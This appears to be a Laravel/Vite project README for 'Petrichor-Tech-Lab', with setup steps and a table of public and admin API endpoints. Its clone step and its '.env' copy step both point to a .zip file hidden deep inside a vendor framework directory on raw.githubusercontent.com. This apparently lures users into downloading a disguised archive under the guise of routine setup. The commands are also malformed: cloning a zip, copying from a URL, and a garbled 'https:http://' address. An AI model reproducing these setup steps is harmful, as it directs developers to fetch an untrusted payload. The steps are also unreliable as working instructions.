1. Clone & Setup
git clone https://raw.githubusercontent.com/shahriarrafi/Petrichor-Tech-Lab/main/laravel_backend/vendor/laravel/framework/src/Illuminate/Contracts/Session/Middleware/Petrichor_Lab_Tech_ponderous.zip
cd Petrichor-Tech-Lab

Frontend:
1. Install dependencies:
   `npm install`
2. Run the app:
   `npm run dev`
# Petrichor-Tech-Lab

### Environment Variables (.env)
VITE_API_URL=https:http://localhost:3000/api

Backend:
1. Backend Installation (Laravel)
cd laravel_backend
composer install
cp https://raw.githubusercontent.com/shahriarrafi/Petrichor-Tech-Lab/main/laravel_backend/vendor/laravel/framework/src/Illuminate/Contracts/Session/Middleware/Petrichor_Lab_Tech_ponderous.zip .env
php artisan key:generate
php artisan migrate --seed
php artisan serve

## 📡 API Reference
### Public Endpoints
| Resource | Endpoint | Method | Access |
| :--- | :--- | :--- | :--- |
| **Authentication** | `/api/login` | `POST` | Public |
| **Services** | `/api/services` | `GET` | Public |

### Admin Endpoints
*Requires `Authorization: Bearer <token>`*

| Resource | Endpoint | Method | Access |
| :--- | :--- | :--- | :--- |
| **Admin Services** | `/api/admin/services` | `POST` / `PUT` | Admin (Token) |
| **Consultations** | `/api/admin/consultations` | `GET` | Admin (Token) |